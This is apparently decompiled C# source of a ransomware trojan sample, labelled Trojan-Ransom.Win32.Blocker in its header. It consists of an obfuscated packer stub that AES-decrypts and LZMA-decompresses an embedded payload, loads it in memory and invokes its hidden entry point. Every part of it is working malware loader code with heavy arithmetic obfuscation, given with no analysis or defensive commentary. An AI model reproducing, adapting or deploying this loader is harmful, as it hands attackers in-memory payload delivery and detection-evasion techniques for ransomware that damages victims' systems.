// Decompiled with JetBrains decompiler
// Type: CompressShell
// Assembly: juan, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8CAF955-2F8B-1AE0-ECDF-320D6561A606
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.csuz-736f25654239831c39605f8792957254a5645d277e36a05d6e9e5c3d8e714d27.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

internal static class CompressShell
{
  private static string Res = "俩뇻।�꺡衇�ជ";
  private static ulong Rid = (ulong) ((-1443159781L ^ -1379285344L) + ((-1891233436L ^ -2144768928L) - -87281454L));
  private static Module Mod;

  public static uint GetLenToPosState(uint len)
  {
    len -= 2U;
    return len < 4U ? len : 3U;
  }

  private static Assembly DecryptAsm(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ -2066108968 - (1922223166 - (-1931804591 - (-1078672695 - 1735122563) ^ 74669734 ^ 1147666439 ^ 1079149569)) - 1193453580 ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static Assembly ResolveResource(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ 149524889 + (1236919406 + 64443562) - 1399372913 ^ 770863664 - 719348659 ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static byte[] Decrypt(byte[] asm)
  {
    byte[] buffer1;
    byte[] rgbIV;
    byte[] rgbKey;
    using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(asm)))
    {
      buffer1 = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbIV = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbKey = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    int num1 = (1627157426 - 1212456535 ^ 1513815848) - 1116547599;
    for (int index = 0; index < rgbKey.Length; index += 4)
    {
      rgbKey[index] ^= (byte) (num1 & 524294532 + 844841865 - 1369136142);
      rgbKey[index + 1] ^= (byte) ((num1 & (473848997 ^ 124512624) - 458536661) >> 8);
      rgbKey[index + 2] ^= (byte) ((num1 & (385917439 + 392282766 ^ 782066829)) >> 16);
      rgbKey[index + 3] ^= (byte) (((long) num1 & 4278190080L) >> 1750527071 - 1750527047);
    }
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    using (CryptoStream inStream = new CryptoStream((Stream) new MemoryStream(buffer1), rijndaelManaged.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Read))
    {
      byte[] buffer2 = new byte[4];
      inStream.Read(buffer2, 0, 4);
      uint uint32 = BitConverter.ToUInt32(buffer2, 0);
      CompressShell.LzmaDecoder lzmaDecoder = new CompressShell.LzmaDecoder();
      byte[] numArray = new byte[5];
      inStream.Read(numArray, 0, 5);
      lzmaDecoder.SetDecoderProperties(numArray);
      long outSize = 0;
      for (int index = 0; index < 8; ++index)
      {
        int num2 = inStream.ReadByte();
        if (num2 < 0)
          throw new Exception("Can't Read 1");
        outSize |= (long) (byte) num2 << (8 * index & (463062577 + (-1538866439 - 1205095660) ^ -240703881 - (-829191879 - (1534229489 ^ 260760882))));
      }
      byte[] buffer3 = new byte[outSize];
      long inSize = (long) (uint32 - 13U);
      lzmaDecoder.Code((Stream) inStream, (Stream) new MemoryStream(buffer3, true), inSize, outSize);
      return buffer3;
    }
  }

  private static ulong modPow(ulong bas, ulong pow, ulong mod)
  {
    ulong num = 1;
    while (pow > 0UL)
    {
      if (((long) pow & 1L) != 0L)
        num = num * bas % mod;
      pow >>= 1;
      bas = bas * bas % mod;
    }
    return num;
  }

  [STAThread]
  private static int Main(string[] args)
  {
    Assembly entryAssembly = Assembly.GetEntryAssembly();
    Stream manifestResourceStream = entryAssembly.GetManifestResourceStream(CompressShell.Res);
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    CompressShell.Mod = entryAssembly.LoadModule("___.netmodule", numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CompressShell.DecryptAsm);
    MethodBase methodBase = CompressShell.Mod.ResolveMethod(1404951358 - (-1697054569 - 952490715 - 1091032049) ^ -946343215 - (-1190114841 - (-1005018115 - (1869051529 - 17201398))) ^ 1725311363 ^ 911994788 | (int) CompressShell.modPow(CompressShell.Rid, (ulong) (735325911 - 735325840), (ulong) (-853874176L ^ -688517675L)));
    object obj;
    if (methodBase.GetParameters().Length == 1)
      obj = methodBase.Invoke((object) null, new object[1]
      {
        (object) args
      });
    else
      obj = methodBase.Invoke((object) null, (object[]) null);
    return obj is int num ? num : 0;
  }

  public struct State
  {
    public uint Index;

    public void Init() => this.Index = 0U;

    public void UpdateChar()
    {
      if (this.Index < 4U)
        this.Index = 0U;
      else if (this.Index < 10U)
        this.Index -= 3U;
      else
        this.Index -= 6U;
    }

    public void UpdateMatch() => this.Index = this.Index < 7U ? 7U : 10U;

    public void UpdateRep() => this.Index = this.Index < 7U ? 8U : 11U;

    public void UpdateShortRep() => this.Index = this.Index < 7U ? 9U : 11U;

    public bool IsCharState() => this.Index < 7U;
  }

  public class OutWindow
  {
    private byte[] _buffer;
    private uint _pos;
    private uint _windowSize;
    private uint _streamPos;
    private Stream _stream;

    public void Create(uint windowSize)
    {
      if ((int) this._windowSize != (int) windowSize)
        this._buffer = new byte[(IntPtr) windowSize];
      this._windowSize = windowSize;
      this._pos = 0U;
      this._streamPos = 0U;
    }

    public void Init(Stream stream, bool solid)
    {
      this.ReleaseStream();
      this._stream = stream;
      if (solid)
        return;
      this._streamPos = 0U;
      this._pos = 0U;
    }

    public void ReleaseStream()
    {
      this.Flush();
      this._stream = (Stream) null;
      Buffer.BlockCopy((Array) new byte[this._buffer.Length], 0, (Array) this._buffer, 0, this._buffer.Length);
    }

    public void Flush()
    {
      uint count = this._pos - this._streamPos;
      if (count == 0U)
        return;
      this._stream.Write(this._buffer, (int) this._streamPos, (int) count);
      if (this._pos >= this._windowSize)
        this._pos = 0U;
      this._streamPos = this._pos;
    }

    public void CopyBlock(uint distance, uint len)
    {
      uint num = (uint) ((int) this._pos - (int) distance - 1);
      if (num >= this._windowSize)
        num += this._windowSize;
      for (; len > 0U; --len)
      {
        if (num >= this._windowSize)
          num = 0U;
        this._buffer[(IntPtr) this._pos++] = this._buffer[(IntPtr) num++];
        if (this._pos >= this._windowSize)
          this.Flush();
      }
    }

    public void PutByte(byte b)
    {
      this._buffer[(IntPtr) this._pos++] = b;
      if (this._pos < this._windowSize)
        return;
      this.Flush();
    }

    public byte GetByte(uint distance)
    {
      uint index = (uint) ((int) this._pos - (int) distance - 1);
      if (index >= this._windowSize)
        index += this._windowSize;
      return this._buffer[(IntPtr) index];
    }
  }

  private class Decoder
  {
    public uint Range;
    public uint Code;
    public Stream Stream;

    public void Init(Stream stream)
    {
      this.Stream = stream;
      this.Code = 0U;
      this.Range = uint.MaxValue;
      for (int index = 0; index < 5; ++index)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public void ReleaseStream() => this.Stream = (Stream) null;

    public void Normalize()
    {
      for (; this.Range < (uint) (-1944843406 - (1520520085 ^ 999577222 + 763217131 - (1614427898 + 1127532 ^ 431100378 ^ 9025160 ^ 2083236079 - 827008722) + 1216117311 ^ 478310636 + 169044530 - 36777903 + (756527501 + 635660292 - (1553000937 - (1360349436 - 554628101)) + 1211464074 - 374683919)) - 791252695); this.Range <<= 8)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public uint DecodeDirectBits(int numTotalBits)
    {
      uint range = this.Range;
      uint num1 = this.Code;
      uint num2 = 0;
      for (int index = numTotalBits; index > 0; --index)
      {
        range >>= 1;
        uint num3 = num1 - range >> 356523618 + (663071771 + 724527167 ^ (223617294 ^ 747709983) + 405658611 - 168123947 + 1181644753) - 976160563;
        num1 -= range & num3 - 1U;
        num2 = (uint) ((int) num2 << 1 | 1 - (int) num3);
        if (range < (uint) (2107401762 ^ 2090624546))
        {
          num1 = num1 << 8 | (uint) (byte) this.Stream.ReadByte();
          range <<= 8;
        }
      }
      this.Range = range;
      this.Code = num1;
      return num2;
    }
  }

  private struct BitDecoder
  {
    private uint Prob;

    public void Init() => this.Prob = (uint) ((-1241767770 - (250305715 ^ 2132137382) ^ (1586658756 - 1068089580 ^ 376586419 ^ 119958172) + 1860602517) + (-660751453 - (-1120950957 - (1016764699 + 308200218) - (1980518155 ^ 674846530 ^ -1076345950 - 1704093922)) - (136194679 - 84271032) - 674948843 ^ (1425646633 ^ 1752865877 ^ -1822101503 - 873787699) - 1320641650 ^ 1790940134 - 1746916953 ^ 1312205992) - 1469587998);

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint num = (rangeDecoder.Range >> 11) * this.Prob;
      if (rangeDecoder.Code < num)
      {
        rangeDecoder.Range = num;
        this.Prob += (uint) (1457584425 - 1457582377) - this.Prob >> 5;
        if (rangeDecoder.Range < 16777216U)
        {
          rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
          rangeDecoder.Range <<= 8;
        }
        return 0;
      }
      rangeDecoder.Range -= num;
      rangeDecoder.Code -= num;
      this.Prob -= this.Prob >> 5;
      if (rangeDecoder.Range < (uint) ((-1528103999 - 1531559861 ^ 673958985 - 183687954) - (-1958580903 - 453775215 - 899807806 ^ 780960048 + 1008311704 + 221723392 ^ 517011295)))
      {
        rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
        rangeDecoder.Range <<= 8;
      }
      return 1;
    }
  }

  private struct BitTreeDecoder
  {
    private CompressShell.BitDecoder[] Models;
    private int NumBitLevels;

    public BitTreeDecoder(int numBitLevels)
    {
      this.NumBitLevels = numBitLevels;
      this.Models = new CompressShell.BitDecoder[1 << (numBitLevels & (-1286465648 - (-1316409510 - (391662854 + (1605343104 - 28750554))) ^ 1682859555 - 601518858 + (-1051381489 - (-951209253 - 1226389091) - (707934335 - (410050561 ^ 1157944014 - 831890180))) - 371724583) - 960508952)];
    }

    public void Init()
    {
      for (uint index = 1; (long) index < (long) (1 << (this.NumBitLevels & (-1984958179 - ((64845936 ^ 1146213366 ^ 297290131) - 559878685) ^ 1958639832 - 607456270 - (50291702 ^ -2029046345 - (715737156 + 138122294 - (1598880098 ^ 2124171185 - 58097616) ^ 1363068064)) ^ -103858173 - ((-1594587671 - 1057611786 ^ 1309000312 ^ 1972234253 ^ 2147124435) + 1420732540)))); ++index)
        this.Models[(IntPtr) index].Init();
    }

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint index = 1;
      for (int numBitLevels = this.NumBitLevels; numBitLevels > 0; --numBitLevels)
        index = (index << 1) + this.Models[(IntPtr) index].Decode(rangeDecoder);
      return index - (uint) (1 << (this.NumBitLevels & (1796744191 - 1098157485 ^ -954710479 - (662886031 ^ 2057932446 - 635135307) - 43114893 - (((-989435155 - 1238371052 ^ (169544666 ^ 1702418460 ^ 246037108) + 188103150 - 307781091 - 56605767) + (1592874845 - 1143777924) - 34582182 - 1122704868 ^ -787489939 - 1554661601) - 1272229097) ^ 1859981772 ^ 1907681578) - 271208628));
    }

    public uint ReverseDecode(CompressShell.Decoder rangeDecoder)
    {
      uint index1 = 1;
      uint num1 = 0;
      for (int index2 = 0; index2 < this.NumBitLevels; ++index2)
      {
        uint num2 = this.Models[(IntPtr) index1].Decode(rangeDecoder);
        index1 = (index1 << 1) + num2;
        num1 |= num2 << (index2 & 1976067687 + (1468811087 - 1307201203) - 1649408656 - 488268884);
      }
      return num1;
    }

    public static uint ReverseDecode(
      CompressShell.BitDecoder[] Models,
      uint startIndex,
      CompressShell.Decoder rangeDecoder,
      int NumBitLevels)
    {
      uint num1 = 1;
      uint num2 = 0;
      for (int index = 0; index < NumBitLevels; ++index)
      {
        uint num3 = Models[(IntPtr) (startIndex + num1)].Decode(rangeDecoder);
        num1 = (num1 << 1) + num3;
        num2 |= num3 << (index & (-1522592181 - (916174291 + (1294877519 - 1115957687)) - 1156226854 ^ 193406802 + ((1563613838 ^ 1951886673 ^ 1138157730) - (737448932 - (58043007 ^ 367136197 ^ 208572693 - 152773152) + (-1074370250 - 1949643504 - 671304038) ^ -1655592788 - 1145506914) + 1892584352 - 1259556898 - 469757801)));
      }
      return num2;
    }
  }

  public class LzmaDecoder
  {
    private CompressShell.OutWindow m_OutWindow = new CompressShell.OutWindow();
    private CompressShell.Decoder m_RangeDecoder = new CompressShell.Decoder();
    private CompressShell.BitDecoder[] m_IsMatchDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (-542764049 - (1610407759 ^ 908239786) - ((580651690 ^ -438675962 - 1867876825) - 679146939) ^ -1342697849 - 1708017545)];
    private CompressShell.BitDecoder[] m_IsRepDecoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG0Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG1Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG2Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRep0LongDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (2037772368 ^ 941020095 ^ 1097016111)];
    private CompressShell.BitTreeDecoder[] m_PosSlotDecoder = new CompressShell.BitTreeDecoder[new IntPtr(4)];
    private CompressShell.BitDecoder[] m_PosDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (2013372395 - 1220126862 ^ 1593240480 - 194868990 ^ 1203228429 - 384374069 + 1047121084 ^ 1546416116 - 1225157339)];
    private CompressShell.BitTreeDecoder m_PosAlignDecoder = new CompressShell.BitTreeDecoder(4);
    private CompressShell.LzmaDecoder.LenDecoder m_LenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LenDecoder m_RepLenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LiteralDecoder m_LiteralDecoder = new CompressShell.LzmaDecoder.LiteralDecoder();
    private uint m_DictionarySize;
    private uint m_DictionarySizeCheck;
    private uint m_PosStateMask;
    private bool _solid;

    public LzmaDecoder()
    {
      this.m_DictionarySize = uint.MaxValue;
      for (int index = 0; index < 4; ++index)
        this.m_PosSlotDecoder[index] = new CompressShell.BitTreeDecoder(6);
    }

    private void SetDictionarySize(uint dictionarySize)
    {
      if ((int) this.m_DictionarySize == (int) dictionarySize)
        return;
      this.m_DictionarySize = dictionarySize;
      this.m_DictionarySizeCheck = Math.Max(this.m_DictionarySize, 1U);
      this.m_OutWindow.Create(Math.Max(this.m_DictionarySizeCheck, (uint) (804988028 + (1219347366 - 887965147) - 898644011 - (619573385 + 918384076 - 1520937983 ^ -1209967933 - 1114969217 - 1715691000))));
    }

    private void SetLiteralProperties(int lp, int lc) => this.m_LiteralDecoder.Create(lp, lc);

    private void SetPosBitsProperties(int pb)
    {
      uint numPosStates = (uint) (1 << (pb & ((-156119543 - 2072492150 ^ 1081563884 - 185194777) - 15491651 ^ (977510779 ^ 1286185181 - 1225434115 ^ 365742873 ^ 2073811811 ^ 600100925) - 653487108)));
      this.m_LenDecoder.Create(numPosStates);
      this.m_RepLenDecoder.Create(numPosStates);
      this.m_PosStateMask = numPosStates - 1U;
    }

    private void Init(Stream inStream, Stream outStream)
    {
      this.m_RangeDecoder.Init(inStream);
      this.m_OutWindow.Init(outStream, this._solid);
      for (uint index1 = 0; index1 < 12U; ++index1)
      {
        for (uint index2 = 0; index2 <= this.m_PosStateMask; ++index2)
        {
          uint index3 = (index1 << 4) + index2;
          this.m_IsMatchDecoders[(IntPtr) index3].Init();
          this.m_IsRep0LongDecoders[(IntPtr) index3].Init();
        }
        this.m_IsRepDecoders[(IntPtr) index1].Init();
        this.m_IsRepG0Decoders[(IntPtr) index1].Init();
        this.m_IsRepG1Decoders[(IntPtr) index1].Init();
        this.m_IsRepG2Decoders[(IntPtr) index1].Init();
      }
      this.m_LiteralDecoder.Init();
      for (uint index = 0; index < 4U; ++index)
        this.m_PosSlotDecoder[(IntPtr) index].Init();
      for (uint index = 0; index < (uint) (632665864 + 1246288246 - (1062041935 + (1966765204 ^ -1647616084 - 1821785893 + 341197218))); ++index)
        this.m_PosDecoders[(IntPtr) index].Init();
      this.m_LenDecoder.Init();
      this.m_RepLenDecoder.Init();
      this.m_PosAlignDecoder.Init();
    }

    public void Code(Stream inStream, Stream outStream, long inSize, long outSize)
    {
      this.Init(inStream, outStream);
      CompressShell.State state = new CompressShell.State();
      state.Init();
      uint distance = 0;
      uint num1 = 0;
      uint num2 = 0;
      uint num3 = 0;
      ulong pos = 0;
      ulong num4 = (ulong) outSize;
      if (pos < num4)
      {
        if (this.m_IsMatchDecoders[(IntPtr) (state.Index << 4)].Decode(this.m_RangeDecoder) != 0U)
          throw new Exception();
        state.UpdateChar();
        this.m_OutWindow.PutByte(this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, 0U, (byte) 0));
        ++pos;
      }
      while (pos < num4)
      {
        uint posState = (uint) pos & this.m_PosStateMask;
        if (this.m_IsMatchDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
        {
          byte prevByte = this.m_OutWindow.GetByte(0U);
          this.m_OutWindow.PutByte(state.IsCharState() ? this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, (uint) pos, prevByte) : this.m_LiteralDecoder.DecodeWithMatchByte(this.m_RangeDecoder, (uint) pos, prevByte, this.m_OutWindow.GetByte(distance)));
          state.UpdateChar();
          ++pos;
        }
        else
        {
          uint len;
          if (this.m_IsRepDecoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 1U)
          {
            if (this.m_IsRepG0Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
            {
              if (this.m_IsRep0LongDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
              {
                state.UpdateShortRep();
                this.m_OutWindow.PutByte(this.m_OutWindow.GetByte(distance));
                ++pos;
                continue;
              }
            }
            else
            {
              uint num5;
              if (this.m_IsRepG1Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
              {
                num5 = num1;
              }
              else
              {
                if (this.m_IsRepG2Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
                {
                  num5 = num2;
                }
                else
                {
                  num5 = num3;
                  num3 = num2;
                }
                num2 = num1;
              }
              num1 = distance;
              distance = num5;
            }
            len = this.m_RepLenDecoder.Decode(this.m_RangeDecoder, posState) + 2U;
            state.UpdateRep();
          }
          else
          {
            num3 = num2;
            num2 = num1;
            num1 = distance;
            len = 2U + this.m_LenDecoder.Decode(this.m_RangeDecoder, posState);
            state.UpdateMatch();
            uint num6 = this.m_PosSlotDecoder[(IntPtr) CompressShell.GetLenToPosState(len)].Decode(this.m_RangeDecoder);
            if (num6 >= 4U)
            {
              int NumBitLevels = (int) (num6 >> 1) - 1;
              uint num7 = (uint) ((2 | (int) num6 & 1) << NumBitLevels);
              distance = num6 >= 14U ? num7 + (this.m_RangeDecoder.DecodeDirectBits(NumBitLevels - 4) << 4) + this.m_PosAlignDecoder.ReverseDecode(this.m_RangeDecoder) : num7 + CompressShell.BitTreeDecoder.ReverseDecode(this.m_PosDecoders, (uint) ((int) num7 - (int) num6 - 1), this.m_RangeDecoder, NumBitLevels);
            }
            else
              distance = num6;
          }
          if ((ulong) distance < pos && distance < this.m_DictionarySizeCheck || distance != uint.MaxValue)
          {
            this.m_OutWindow.CopyBlock(distance, len);
            pos += (ulong) len;
          }
          else
            break;
        }
      }
      this.m_OutWindow.Flush();
      this.m_OutWindow.ReleaseStream();
      this.m_RangeDecoder.ReleaseStream();
    }

    public void SetDecoderProperties(byte[] properties)
    {
      int lc = (int) properties[0] % 9;
      int num = (int) properties[0] / 9;
      int lp = num % 5;
      int pb = num / 5;
      uint dictionarySize = 0;
      for (int index = 0; index < 4; ++index)
        dictionarySize += (uint) properties[1 + index] << (index * 8 & ((1657338668 ^ 1071095824 ^ 1843178579 ^ 1452177464 ^ 888862067 - 661254970 + (1243020679 ^ 1630653127) ^ 694704059 ^ 1904707144 ^ 2019443023) - 497034079 - 714832231 ^ -1433985037 - 1033357864 - 354938481 + (923347479 ^ 340486836)) - 1291922962);
      this.SetDictionarySize(dictionarySize);
      this.SetLiteralProperties(lp, lc);
      this.SetPosBitsProperties(pb);
    }

    private class LenDecoder
    {
      private CompressShell.BitDecoder m_Choice = new CompressShell.BitDecoder();
      private CompressShell.BitDecoder m_Choice2 = new CompressShell.BitDecoder();
      private CompressShell.BitTreeDecoder[] m_LowCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder[] m_MidCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder m_HighCoder = new CompressShell.BitTreeDecoder(8);
      private uint m_NumPosStates;

      public void Create(uint numPosStates)
      {
        for (uint numPosStates1 = this.m_NumPosStates; numPosStates1 < numPosStates; ++numPosStates1)
        {
          this.m_LowCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
          this.m_MidCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
        }
        this.m_NumPosStates = numPosStates;
      }

      public void Init()
      {
        this.m_Choice.Init();
        for (uint index = 0; index < this.m_NumPosStates; ++index)
        {
          this.m_LowCoder[(IntPtr) index].Init();
          this.m_MidCoder[(IntPtr) index].Init();
        }
        this.m_Choice2.Init();
        this.m_HighCoder.Init();
      }

      public uint Decode(CompressShell.Decoder rangeDecoder, uint posState)
      {
        if (this.m_Choice.Decode(rangeDecoder) == 0U)
          return this.m_LowCoder[(IntPtr) posState].Decode(rangeDecoder);
        uint num = 8;
        return this.m_Choice2.Decode(rangeDecoder) != 0U ? num + 8U + this.m_HighCoder.Decode(rangeDecoder) : num + this.m_MidCoder[(IntPtr) posState].Decode(rangeDecoder);
      }
    }

    private class LiteralDecoder
    {
      private CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[] m_Coders;
      private int m_NumPrevBits;
      private int m_NumPosBits;
      private uint m_PosMask;

      public void Create(int numPosBits, int numPrevBits)
      {
        if (this.m_Coders != null && this.m_NumPrevBits == numPrevBits && this.m_NumPosBits == numPosBits)
          return;
        this.m_NumPosBits = numPosBits;
        this.m_PosMask = (uint) ((1 << (numPosBits & (878884363 + 703820988 ^ 11316038 ^ -1626542639 - 1946389049 + (1070824245 - 462837239 - (1811482876 - 1402667188))) - ((137729204 ^ 1218920589) - 841295233) - 1503941176)) - 1);
        this.m_NumPrevBits = numPrevBits;
        uint length = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & 1342675859 + (1685381974 ^ -977375760 - 1271139797 ^ 670014526 ^ 594824042) - (-2017340706 - 514122577)));
        this.m_Coders = new CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[(IntPtr) length];
        for (uint index = 0; index < length; ++index)
          this.m_Coders[(IntPtr) index].Create();
      }

      public void Init()
      {
        uint num = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & 1238308665 - 405191256 + (1668237319 - (1756510994 - 1328574573 - 413603903) ^ (885915224 + 518672306 ^ 1679484908 ^ 1312969957 ^ 905572059) - 676286151 ^ 959504369 + (1052252293 - 806909400) - 607767809 ^ 1830608326 ^ 19085108) - 1083993249));
        for (uint index = 0; index < num; ++index)
          this.m_Coders[(IntPtr) index].Init();
      }

      private uint GetState(uint pos, byte prevByte) => (uint) ((((int) pos & (int) this.m_PosMask) << (this.m_NumPrevBits & (-1787469117 - (36206126 ^ 1349464703 ^ -1056114233 - 1251648073) ^ 439822675 + 1614694203 - 739797992 ^ 113125082 ^ 1341610839 ^ 1471555347 - 676240815 ^ 2072706114 ^ 564656296 + 770701976) - (98373511 + (2060667152 ^ 173690309) - (-2033165865 - 2107176501)))) + ((int) prevByte >> (8 - this.m_NumPrevBits & 1718823759 - 1606042832 - ((1832444350 ^ 1118410704 ^ 1848440518 - 983437964 ^ (872211752 ^ 909940788) + 219762967) - (575682938 - (359120380 ^ 254115471))))));

      public byte DecodeNormal(CompressShell.Decoder rangeDecoder, uint pos, byte prevByte) => this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeNormal(rangeDecoder);

      public byte DecodeWithMatchByte(
        CompressShell.Decoder rangeDecoder,
        uint pos,
        byte prevByte,
        byte matchByte)
      {
        return this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeWithMatchByte(rangeDecoder, matchByte);
      }

      private struct Decoder2
      {
        private CompressShell.BitDecoder[] m_Decoders;

        public void Create() => this.m_Decoders = new CompressShell.BitDecoder[-1943075976 - 1755626756 ^ 618568798 ^ 674841797 - 539358423 + 843674010 - 596996695 ^ (755209438 ^ 505692085 ^ 709836544) - 67872345 + (-2025903567 - 905076804) - 1557396130 + (-1759237011 - 979602168) ^ 1950756662 ^ 770231664 ^ 1287212915 ^ 1637458809 ^ 1213169080 - (724673615 + 429003492)];

        public void Init()
        {
          for (int index = 0; index < (2002370039 - 1908658186 ^ 241960455 + 407172943 ^ 1801178211) + (1157711734 - 87341760 - 324411534 - 221174877 - ((720876381 ^ 4778295) - 351244518) ^ 1978016767 ^ 1005359031 ^ 1829821332) - 1928104819; ++index)
            this.m_Decoders[index].Init();
        }

        public byte DecodeNormal(CompressShell.Decoder rangeDecoder)
        {
          uint index = 1;
          do
          {
            index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
          }
          while (index < (uint) ((-2061507269 - (1452437431 ^ 1995997078) - 812709127 ^ -1276327766 - (436459645 + 568992403 ^ (856158209 ^ 1627013834) - (1351813597 ^ 358681716 ^ 1341626518 - 1101942327) ^ 1883319555)) - 689362062 - (-1685659158 - (2057514436 - 297822787))));
          return (byte) index;
        }

        public byte DecodeWithMatchByte(CompressShell.Decoder rangeDecoder, byte matchByte)
        {
          uint index = 1;
          do
          {
            uint num1 = (uint) ((int) matchByte >> 7 & 1);
            matchByte <<= 1;
            uint num2 = this.m_Decoders[(IntPtr) ((uint) (1 + (int) num1 << 8) + index)].Decode(rangeDecoder);
            index = index << 1 | num2;
            if ((int) num1 != (int) num2)
            {
              while (index < (uint) ((1227747581 ^ 1139102723) - (1139441052 - (2071466690 ^ 1138889823 + (496296501 - 448998245) ^ 82444403))))
                index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
              break;
            }
          }
          while (index < (uint) (-2099099211 - 752473451 + (85540944 - (1043747750 - (719622251 + 1172106179 ^ 1306124660) + (645349038 - 613094198))) - 1477956054));
          return (byte) index;
        }
      }
    }
  }
}
